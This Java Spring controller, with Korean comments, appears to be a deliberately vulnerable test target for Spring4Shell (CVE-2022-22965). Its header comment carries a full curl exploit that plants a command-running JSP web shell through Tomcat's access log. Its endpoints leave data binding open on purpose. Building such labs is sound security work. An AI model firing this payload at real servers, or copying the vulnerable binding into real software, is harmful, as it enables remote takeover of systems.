package com.security.test.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

/**
 * Spring4Shell (CVE-2022-22965) 취약점 테스트 컨트롤러
 *
 * ⚠️ 경고: 이 코드는 의도적으로 취약하게 작성되었습니다.
 * 교육 및 보안 테스트 목적으로만 사용하세요.
 *
 * 공격 엔드포인트:
 * GET  /test
 * POST /test
 *
 * 공격 방법:
 * curl "http://localhost:8080/spring4shell-test-1.0/test?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 */
@Controller
public class TestController {

    /**
     * 취약한 GET 엔드포인트
     *
     * Spring의 데이터 바인딩이 자동으로 TestObject의 setter를 호출합니다.
     * 공격자는 class.module.classLoader 경로를 통해 Tomcat의 AccessLogValve에 접근할 수 있습니다.
     */
    @GetMapping("/test")
    public String test(@ModelAttribute TestObject testObject) {
        return "test";
    }

    /**
     * 취약한 POST 엔드포인트
     */
    @PostMapping("/test")
    public String testPost(@ModelAttribute TestObject testObject) {
        return "test-result";
    }

    /**
     * 간단한 POJO 클래스
     *
     * Spring은 요청 파라미터를 이 클래스의 속성에 자동으로 바인딩합니다.
     * 공격자는 'class' 속성을 통해 getClass() 메서드에 접근할 수 있습니다.
     */
    public static class TestObject {
        private String name;
        private String value;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public String getValue() {
            return value;
        }

        public void setValue(String value) {
            this.value = value;
        }
    }
}
